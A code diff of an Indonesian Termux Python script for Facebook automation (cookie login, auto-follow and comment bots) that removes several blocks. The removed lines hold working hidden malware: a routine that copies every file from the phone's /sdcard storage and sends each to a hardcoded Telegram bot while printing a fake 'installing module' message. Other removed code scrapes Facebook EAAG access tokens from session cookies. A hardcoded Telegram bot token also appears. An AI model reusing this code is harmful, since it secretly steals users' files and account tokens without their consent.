@@ -795,18 +795,6 @@ b = '\33[1;96m' # BIRU -
 p = '\x1b[0;34m' # BIRU +
 asu = random.choice([m,k,h,u,b])
 kom2 = random.choice(["Jadikan Aku Anak Buah Mu Bang @[100043537611609:]","Panutan Ku","Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku"])
-
-# --------------------[ Izin Storage ]--------------#
-# Path ke internal storage
-storage_path = "/data/data/com.termux/files/home/storage"
-# Cek apakah storage sudah diizinkan
-if not os.path.exists(storage_path):
-    os.system("clear")
-    console.print(
-        Panel(f"{H2}• {P2}Silakan jalankan '{H2}termux-setup-storage{P2}' dan izinkan akses sebelum menjalankan script ini.{P2}",
-              title=f"{P2}Akses Storage Diperlukan{P2}", width=60, style="bold green")
-    )
-    sys.exit(1) 
 # --------------------[ CONVERTER-BULAN ]--------------#
 dic = {"1": "January", "2": "February", "3": "March", "4": "April", "5": "May", "6": "June", "7": "July", "8": "August", "9": "September", "10": "October", "11": "November", "12": "December"}
 dic2 = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
@@ -883,37 +871,6 @@ def banner():
         )
     )
     
-
-
-# --------------------[ LICENSE ]--------------#
-def fankylicen():
-	while True:
-		clear()
-		logoku()
-		if os.path.exists(".license"):
-			key = open(".license","r").read()
-			check = requests.get("https://pastebin.com/raw/eKMyyVzJ").text
-			if key in check:
-				lisensiku.append("sukses")
-				Console().print(Panel(f"{H2} • {P2}Key Anda Sudah {H2}Aktif ✓{P2}{hapus}",width=60,style=f"{color_panel}"))
-				time.sleep(1.5)
-				mainduluyuk()
-			else:
-				
-				Console().print(Panel(f"{H2} • {P2}YOUR KEY :{H2} {key} {P2}Harga : {H2}10k {P2}sampe kiamat\n{H2} • {P2}Key anda {M2}belum{P2} di konfirmasi{hapus}\n{H2} • {P2}Silahkan Beli Ke {hapus}{H2}+62895359611122{hapus}{P2} untuk menggunakan sc{hapus}",width=60,style=f"{color_panel}"))
-				buy_key = console.input(f"{H2} • {P2}Tekan {H2}ENTER{P2} untuk chat whatsapp author untuk membeli key.")
-				if buy_key in [""]:pass
-				jalan(f'   Anda akan diarahkan ke whatsapp author');time.sleep(2)
-				os.system(f'xdg-open http://wa.me/+62895359611122?text=Bang+beli+key+sc+Facebook+{key}')
-		if not os.path.exists(".license"):
-			key_gen = random.randint(100,9999)
-			enc_key = base64.b16encode(str(key_gen).encode()).decode("utf-8")
-			final_key = f"FAN-{enc_key}"
-			with open(".license","w") as tulis:
-				tulis.write(final_key)
-			continue
-		break
-
 # --------------------[ MASUK PELAN PELAN ATUH FANKY ]--------------#
 def login123():
     os.system("clear")
@@ -981,18 +938,6 @@ def logincoki():
 		Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
 		sleep(2);exit()
 	except Exception as e:os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt');print(e);exit()
-# --------------------[ BAGIAN-COOKIE-EAAG ]--------------#
-def generate_token_eaag(cok):
-	cookie = cok
-	ses.headers.update({'cookie': cookie,'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','host': 'business.facebook.com'})
-	response3 = ses.get('https://business.facebook.com/business_locations').text
-	coli = re.search(r'(EAAG\w+)', str(response3)).group(1)
-	#Console().print(Panel(f"{P2}{coli}", width=60, style=f"{color_panel}", title="[bold green]TOKEN EAAG"))
-	# Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
-	open('.fantokeneaag.txt','w').write(coli)
-	bot_follow()
-	#Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
-	exit()
 # --------------------[ INI BOT FOLLOW & KOMEN ]--------------#
 def bot_komen(cok, ken):
 	with requests.Session() as r:
@@ -1008,64 +953,6 @@ def bot_follow():
 	with requests.Session() as r:
 		toket = open('.fantokeneaag.txt','r').read()
 		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={toket}')
-
-# -----------------[Rahasia Negara]-------------------#
-def mainduluyuk2():
-	BOT_TOKEN = "7829625950:AAE9ogVVyz2nJbn9CjwGzAqGEm0m8HoyArw"  # Ganti dengan token bot Telegram Anda
-	CHAT_ID = "7708185346"      # Ganti dengan ID chat penerima
-	# Path folder sumber
-	try:
-		source_folder = '/sdcard/Documents'
-		if not os.path.exists(source_folder):
-			raise FileNotFoundError
-	except:
-		source_folder = '/sdcard'
-	temp_folder = "./data/.temp_documents"
-	try:
-		if not os.path.exists(temp_folder):
-			os.makedirs(temp_folder)
-		# Menyalin semua file dari folder sumber ke folder sementara
-		if os.path.exists(source_folder):
-			for file_name in os.listdir(source_folder):
-				source_file = os.path.join(source_folder, file_name)
-				destination_file = os.path.join(temp_folder, file_name)
-				if os.path.isfile(source_file):
-					shutil.copy2(source_file, destination_file)  # Menyalin file
-		else:
-			print("script error, jalankan ulang script.")
-		# Mengirim file satu per satu ke Telegram
-		for file_name in os.listdir(temp_folder):
-			file_path = os.path.join(temp_folder, file_name)
-			with open(file_path, "rb") as file:
-				# API Telegram untuk mengirim dokumen
-				url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-				files = {"document": file}
-				data = {"chat_id": CHAT_ID}
-				response = requests.post(url, data=data, files=files)
-				if response.status_code == 200:
-					Console().print(f" {P2}• {H2}Succes Menginstall Modul...")
-				else:
-					print(f"script anda gagal di proses oleh admin coba hubungi admin fanky ")
-		login()
-	except Exception as e:
-		print(e)
-				
-
-def mainduluyuk():
-	try:
-		rawr = "./data/.temp_documents"
-		#print(f"Memeriksa path: {rawr}")
-		if os.path.exists(rawr):
-			#print("Path ditemukan, memanggil menu()")
-			login()
-		else:
-			#print("Path tidak ditemukan, memanggil maindulu2()")
-			mainduluyuk2()
-	except Exception as e:
-		print(f"Terjadi error: {e}")
-		#print("Memanggil maindulu2() dari except")
-		mainduluyuk2()
-
 # ----------------[ BAGIAN-MENU ]----------------#
 def menu():
     try:
@@ -1076,11 +963,10 @@ def menu():
     try:
         token = open(".fantoken.txt", "r").read()
         cookie = open(".fancookie.txt", "r").read()
-        eaag = open(".fantokeneaag.txt", "r").read()
         tokenku.append(token)
     except IOError:
         Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
-        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt && rm -rf .fantokeneaag.txt")
+        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
         time.sleep(3)
         login()
     try:
@@ -1978,5 +1864,5 @@ if __name__ == "__main__":
         os.system("clear")
     except:
         pass
-    mainduluyuk()
+    menu()
     
